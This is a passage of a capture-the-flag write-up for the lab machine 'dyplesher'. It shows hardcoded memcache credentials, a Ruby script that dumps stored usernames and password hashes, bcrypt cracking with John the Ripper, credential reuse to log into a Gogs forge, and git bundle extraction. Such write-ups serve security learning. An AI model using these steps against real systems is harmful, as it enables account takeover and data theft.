thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ cd repo_dump</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ git status</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">On branch master</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Your branch is based on &#x27;origin/master&#x27;, but the upstream is gone.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  (use &quot;git branch --unset-upstream&quot; to fixup)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Changes not staged for commit:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  (use &quot;git add/rm &lt;file&gt;...&quot; to update what will be committed)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  (use &quot;git restore &lt;file&gt;...&quot; to discard changes in working directory)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        deleted:    README.md</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        deleted:    index.php</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">no changes added to commit (use &quot;git add&quot; and/or &quot;git commit -a&quot;)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ git restore README.md index.php</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><code>index.php</code></p><div class="language-php codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-php codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">&lt;HTML&gt;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">&lt;BODY&gt;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">&lt;h1&gt;Add key and value to memcache&lt;h1&gt;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">&lt;FORM METHOD=&quot;GET&quot; NAME=&quot;test&quot; ACTION=&quot;&quot;&gt;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">&lt;INPUT TYPE=&quot;text&quot; NAME=&quot;add&quot;&gt;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">&lt;INPUT TYPE=&quot;text&quot; NAME=&quot;val&quot;&gt;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">&lt;INPUT TYPE=&quot;submit&quot; VALUE=&quot;Send&quot;&gt;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">&lt;/FORM&gt;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">&lt;pre&gt;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">&lt;?php</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">if($_GET[&#x27;add&#x27;] != $_GET[&#x27;val&#x27;]){</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        $m = new Memcached();</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        $m-&gt;setOption(Memcached::OPT_BINARY_PROTOCOL, true);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        $m-&gt;setSaslAuthData(&quot;felamos&quot;, &quot;zxcvbnm&quot;);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        $m-&gt;addServer(&#x27;127.0.0.1&#x27;, 11211);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        $m-&gt;add($_GET[&#x27;add&#x27;], $_GET[&#x27;val&#x27;]);</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        echo &quot;Done!&quot;;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">}</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">else {</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        echo &quot;its equal&quot;;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">}</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">?&gt;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">&lt;/pre&gt;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">&lt;/BODY&gt;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">&lt;/HTML&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>So it seems the app was not a rabbit hole but really working.</p><p>Remember of <code>felamos</code>? It was displayed as a dev on the staff page.
So there is a good amount of chance that he re-used his password here: <code>zxcvbnm</code>.
Anyway what&#x27;s 100% sure it&#x27;s that those credentials will work on memcache
service.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="memcache-exploitation">memcache exploitation<a href="#memcache-exploitation" class="hash-link" aria-label="Direct link to memcache exploitation" title="Direct link to memcache exploitation">​</a></h2><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ cat /etc/gemrc</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"># Read about the gemrc format at http://guides.rubygems.org/command-reference/#gem-environment</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"># --user-install is used to install to $HOME/.gem/ by default since we want to separate</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">#                pacman installed gems and gem installed gems</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gem: --user-install</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ gem install dalli</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Fetching dalli-2.7.10.gem</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">WARNING:  You don&#x27;t have /home/cyfun/.gem/ruby/2.7.0/bin in your PATH,</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">          gem executables will not run.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Successfully installed dalli-2.7.10</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Parsing documentation for dalli-2.7.10</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Installing ri documentation for dalli-2.7.10</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Done installing documentation for dalli after 0 seconds</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">1 gem installed</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Ref.: <a href="https://github.com/petergoldstein/dalli" target="_blank" rel="noopener noreferrer">Dalli</a></p><p>I wrote a quick script <code>memcache.rb</code> to connect to memcache and dump credentials.</p><div class="language-ruby codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-ruby codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">options = { username: &#x27;felamos&#x27;, password: &#x27;zxcvbnm&#x27; }</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">dc = Dalli::Client.new(&#x27;dyplesher.htb:11211&#x27;, options)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">usernames = dc.get(&#x27;username&#x27;)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">puts &quot;Usernames:\n#{usernames}&quot;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">passwords = dc.get(&#x27;password&#x27;)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">puts &quot;\nPasswords:\n#{passwords}&quot;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ ruby -I/home/cyfun/.gem/ruby/2.7.0/gems/dalli-2.7.10/lib -rdalli memcache.rb</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">I, [2020-09-26T17:22:50.876277 #35419]  INFO -- : Dalli/SASL authenticating as felamos</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">I, [2020-09-26T17:22:50.921907 #35419]  INFO -- : Dalli/SASL: Authenticated</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Usernames:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">MinatoTW</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">felamos</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">yuntao</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Passwords:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$2a$10$5SAkMNF9fPNamlpWr.ikte0rHInGcU54tvazErpuwGPFePuI1DCJa</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$2y$12$c3SrJLybUEOYmpu1RVrJZuPyzE5sxGeM0ZChDhl8MlczVrxiA3pQK</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$2a$10$zXNCus.UXtiuJE5e6lsQGefnAH3zipl.FRNySz5C4RjitiwUoalS</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="password-hash-cracking">Password hash cracking<a href="#password-hash-cracking" class="hash-link" aria-label="Direct link to Password hash cracking" title="Direct link to Password hash cracking">​</a></h2><p>My tool  gives me the hash type so we can crack the hashes with
<a href="https://www.openwall.com/john/" target="_blank" rel="noopener noreferrer">John the Ripper</a>:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ haiti &#x27;$2a$10$5SAkMNF9fPNamlpWr.ikte0rHInGcU54tvazErpuwGPFePuI1DCJa&#x27;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Blowfish(OpenBSD) [HC: 3200] [JtR: bcrypt]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Woltlab Burning Board 4.x</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">bcrypt [HC: 3200] [JtR: bcrypt]</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ john hashes.txt -w=/usr/share/wordlists/passwords/rockyou.txt --format=bcrypt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ john hashes.txt --show</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">felamos:mommy1</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="http-discovery-2">HTTP discovery 2<a href="#http-discovery-2" class="hash-link" aria-label="Direct link to HTTP discovery 2" title="Direct link to HTTP discovery 2">​</a></h2><p>From the <a href="https://nmap.org/" target="_blank" rel="noopener noreferrer">nmap</a> scan results we also saw there was another HTTP port.</p><p>At <a href="http://dyplesher.htb:3000/" target="_blank" rel="noopener noreferrer">http://dyplesher.htb:3000/</a>, a Gogs git forge is hosted.</p><p><img loading="lazy" src="https://i.imgur.com/VfW56yB.png" class="img_ev3q"></p><ul><li>Gogs version 0.11.91.0811</li><li>Go version 1.12.7</li></ul><p>We can log in with felamos account (but we could have registered a new
account as well) and explore existing projects.</p><p><img loading="lazy" src="https://i.imgur.com/FaFB87k.png" class="img_ev3q"></p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="git-discovery">git discovery<a href="#git-discovery" class="hash-link" aria-label="Direct link to git discovery" title="Direct link to git discovery">​</a></h2><p>Let&#x27;s clone the two repositories.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ git clone http://dyplesher.htb:3000/felamos/gitlab.git</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ git clone http://dyplesher.htb:3000/felamos/memcached.git</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>memcached repository is exactly the same as the one we dumped earlier and gitlab
repository seems empty.</p><p>But on gitlab project there is a release attached, see
<a href="http://dyplesher.htb:3000/felamos/gitlab/releases" target="_blank" rel="noopener noreferrer">http://dyplesher.htb:3000/felamos/gitlab/releases</a></p><p>The release contains a file named repo.zip.</p><p><img loading="lazy" src="https://i.imgur.com/ANXB36x.png" class="img_ev3q"></p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ wget http://dyplesher.htb:3000/attachments/a1b0e8bb-5843-4d5a-aff4-c7ee283e95f2</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ mv a1b0e8bb-5843-4d5a-aff4-c7ee283e95f2 repo.zip</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ ls -lh repo.zip</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">-rw-r--r-- 1 cyfun cyfun 21M Sep 27 14:39 repo.zip</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>The archive is heavy so there must definitly be someting in it that is not
in the repository.
It seems it contains bundle files.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ unzip -t repo.zip</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Archive:  repo.zip</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    testing: repositories/            OK</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    testing: repositories/@hashed/    OK</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    testing: repositories/@hashed/4b/   OK</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    testing: repositories/@hashed/4b/22/   OK</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    testing: repositories/@hashed/4b/22/4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a.bundle   OK</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    testing: repositories/@hashed/4e/   OK</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    testing: repositories/@hashed/4e/07/   OK</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    testing: repositories/@hashed/4e/07/4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce/   OK</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    testing: repositories/@hashed/4e/07/4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce.bundle   OK</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    testing: repositories/@hashed/6b/   OK</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    testing: repositories/@hashed/6b/86/   OK</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    testing: repositories/@hashed/6b/86/6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b.bundle   OK</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    testing: repositories/@hashed/d4/   OK</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    testing: repositories/@hashed/d4/73/   OK</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    testing: repositories/@hashed/d4/73/d4735e3a265e16eee03f59718b9b5d03019c07d8b6c51f90da3a666eec13ab35.bundle   OK</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">No errors detected in compressed data of repo.zip.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ unzip repo.zip</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Let&#x27;s see which bundle could be promising:</p><div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">for</span><span class="token plain"> </span><span class="token for-or-select variable" style="color:rgb(189, 147, 249);font-style:italic">bundle</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">in</span><span class="token plain"> </span><span class="token variable" style="color:rgb(189, 147, 249);font-style:italic">$(</span><span class="token variable function" style="color:rgb(80, 250, 123);font-style:italic">ls</span><span class="token variable" style="color:rgb(189, 147, 249);font-style:italic"> -1 repositories/@hashed/**/*.bundle</span><span class="token variable" style="color:rgb(189, 147, 249);font-style:italic">)</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">do</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">git</span><span class="token plain"> bundle list-heads </span><span class="token variable" style="color:rgb(189, 147, 249);font-style:italic">$bundle</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"> </span><span class="token builtin class-name" style="color:rgb(189, 147, 249)">echo</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">done</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">4eb2a109f5acbcfc4eae0056a40840b2e46299c6 refs/heads/master</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">4eb2a109f5acbcfc4eae0056a40840b2e46299c6 HEAD</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">16a1182b900906b761b69ee32b4be9bb98db5f08 refs/heads/master</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">16a1182b900906b761b69ee32b4be9bb98db5f08 refs/remotes/origin/master</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">16a1182b900906b761b69ee32b4be9bb98db5f08 HEAD</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">bf3e5912762e787b8672ae4d681b23c001e2b03e refs/heads/master</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">bf3e5912762e787b8672ae4d681b23c001e2b03e HEAD</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">f8b5890a6e8ef14090e8609e0a01e664e71ff848 refs/heads/master</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">e5f6c3040ce94750eff4f0a5a343ea67694cb412 refs/tags/0.1</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">f8b5890a6e8ef14090e8609e0a01e664e71ff848 HEAD</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>One has a remote branch and one has a tag. As it doesn&#x27;t help much let&#x27;s clone
them to easily unbundle the repositories.</p><div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">$ </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">for</span><span class="token plain"> </span><span class="token for-or-select variable" style="color:rgb(189, 147, 249);font-style:italic">bundle</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">in</span><span class="token plain"> </span><span class="token variable" style="color:rgb(189, 147, 249);font-style:italic">$(</span><span class="token variable function" style="color:rgb(80, 250, 123);font-style:italic">ls</span><span class="token variable" style="color:rgb(189, 147, 249);font-style:italic"> -1 repositories/@hashed/**/*.bundle</span><span class="token variable" style="color:rgb(189, 147, 249);font-style:italic">)</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">do</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">git</span><span class="token plain"> clone </span><span class="token variable" style="color:rgb(189, 147, 249);font-style:italic">$bundle</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"> </span><span class="token builtin class-name" style="color:rgb(189, 147, 249)">echo</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">done</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 